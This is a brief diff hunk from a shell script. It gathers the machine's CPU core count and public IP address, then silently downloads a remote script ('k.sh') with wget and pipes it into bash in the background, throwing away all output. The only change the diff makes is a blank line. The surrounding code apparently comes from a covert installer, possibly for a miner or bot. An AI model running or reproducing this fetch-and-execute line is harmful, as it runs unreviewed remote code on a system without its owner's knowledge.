@@ -19,6 +19,7 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 
+
 bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
 idlePid="$!"
 
